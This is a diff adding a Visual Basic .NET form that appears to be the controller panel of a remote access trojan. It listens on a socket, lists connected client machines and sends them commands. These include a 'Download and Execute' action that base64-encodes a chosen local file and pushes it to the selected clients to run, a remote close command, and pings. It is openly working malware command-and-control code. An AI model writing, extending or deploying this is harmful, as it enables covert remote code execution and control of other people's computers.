@@ -1,0 +1,117 @@
+﻿Imports System.IO
+
+Public Class Form1
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Messages.F = Me
+        Dim S As New ServerSocket
+
+        Try
+            S.Start(Settings.PORT)
+            AddHandler Client.Read, AddressOf Messages.Read
+        Catch ex As Exception
+            MsgBox(ex.Message)
+        End Try
+
+    End Sub
+
+    Private Async Sub CloseClientToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseClientToolStripMenuItem.Click
+        If LV1.SelectedItems.Count > 0 Then
+            Try
+
+
+                Dim M As New MemoryStream
+                Dim S As Byte() = SB("CLOSE")
+                Await M.WriteAsync(S, 0, S.Length)
+                Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)
+
+                For Each C As ListViewItem In LV1.SelectedItems
+                    Dim x As Client = CType(C.Tag, Client)
+                    Try
+                        x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C.Tag)
+                    Catch ex As Exception
+                        x.isDisconnected()
+                    End Try
+                Next
+
+                Try
+                    Await M.FlushAsync()
+                    M.Dispose()
+                    S = Nothing
+                Catch ex As Exception
+                End Try
+
+            Catch ex As Exception
+            End Try
+        End If
+    End Sub
+
+    Private Async Sub DownloadAndExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadAndExecuteToolStripMenuItem.Click
+        If LV1.SelectedItems.Count > 0 Then
+            Try
+
+                Dim o As New OpenFileDialog
+                With o
+                    .Filter = "(*.*)|*.*"
+                    .Title = "Download and Execute"
+                End With
+
+                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+                    Dim M As New MemoryStream
+                    Dim S As Byte() = SB("DW" & Settings.SPL & Path.GetExtension(o.FileName) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
+                    Await M.WriteAsync(S, 0, S.Length)
+                    Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)
+
+                    For Each C As ListViewItem In LV1.SelectedItems
+                        Dim x As Client = CType(C.Tag, Client)
+
+                        Try
+                            x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C.Tag)
+                        Catch ex As Exception
+                            x.isDisconnected()
+                        End Try
+                    Next
+
+                    Try
+                        Await M.FlushAsync()
+                        M.Dispose()
+                        S = Nothing
+                    Catch ex As Exception
+                    End Try
+
+                End If
+            Catch ex As Exception
+            End Try
+        End If
+    End Sub
+
+    Private Async Sub Timer_Ping_Tick(sender As Object, e As EventArgs) Handles Timer_Ping.Tick
+        If LV1.SelectedItems.Count > 0 Then
+            Try
+
+                Dim M As New MemoryStream
+                Dim S As Byte() = SB("PING!")
+                Await M.WriteAsync(S, 0, S.Length)
+                Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)
+
+                For Each C As ListViewItem In LV1.SelectedItems
+                    Dim x As Client = CType(C.Tag, Client)
+                    Try
+                        x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C.Tag)
+                    Catch ex As Exception
+                        x.isDisconnected()
+                    End Try
+                Next
+
+                Try
+                    Await M.FlushAsync()
+                    M.Dispose()
+                    S = Nothing
+                Catch ex As Exception
+                End Try
+
+            Catch ex As Exception
+            End Try
+        End If
+    End Sub
+End Class
